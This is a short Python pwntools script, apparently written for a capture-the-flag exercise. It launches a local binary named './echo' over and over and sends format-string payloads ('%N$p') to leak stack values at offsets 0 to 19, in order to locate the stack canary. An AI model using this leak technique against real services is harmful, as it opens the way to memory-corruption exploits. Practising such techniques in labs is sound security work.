from pwn import *
#context.log_level='debug'
canary={}
def canaryoff(f,num,after):
	for x in range(num):
		p='%'+str(x)+'$p'
		io=process(f)
		io.sendlineafter(after,p)
		ret=io.recvuntil('\n')
		canary[x]=ret
		io.close()
		

f='./echo'
num=20
after='prompt> '
canaryoff(f,num,after)

for key in canary:
	print('offset=',key,'canary=',canary[key])
